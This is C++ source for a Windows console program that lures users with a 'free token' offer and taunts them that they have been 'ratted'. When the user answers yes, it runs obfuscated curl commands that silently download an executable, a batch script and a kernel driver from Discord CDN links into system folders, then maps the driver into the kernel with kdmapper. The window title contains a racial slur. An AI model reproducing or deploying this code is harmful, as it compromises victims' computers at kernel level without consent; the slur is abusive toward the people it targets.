#include "Functions.h"

int main()
{
    //std::thread(AntiDebugThread).detach();
    NoScrollBar();
    SetConsoleTitleA("FREE TOKEN NIGGA AH HA");
    text("why did you run this??", "+", 5);
    std::this_thread::sleep_for(std::chrono::seconds(2));
    system("cls");
    text("i ratted u gang", "+", 5);
    std::this_thread::sleep_for(std::chrono::seconds(2));
    system("cls");

    std::string choice;

    std::cout << "Give token or dont give token\nYes or No\nChoice -> ";
    std::cin >> choice;
    std::transform(choice.begin(), choice.end(), choice.begin(), tolower);

    if (choice == "yes")
    {
        // Spoofer code
    
        std::cout << ("nah jp im spoofing your pc rn lmao\n");
        DisplayLoading(3, 3000, "Drivers");
        system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1141169900774232195/1144424060000936028/udmanmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1"));
        system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1145823060037996585/1147997891340795974/OBF1x-tcp.bat --output C:\\Windows\\tcp.bat >nul 2>&1"));
        system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1135952277648179363/1138487922836902019/Kernel.sys --output C:\\Windows\\System32\\Windows10Help.sys >nul 2>&1"));
        system(skCrypt("cd C:\\Windows\\System32\\ && kdmapper.exe Windows10Help.sys"));
        system(skCrypt("cls"));
        Check();
        Sleep(-1);

    }
    else if (choice == "no")
    {
        MessageBoxA(NULL, "closing", "bye bye", MB_OK);


    }
}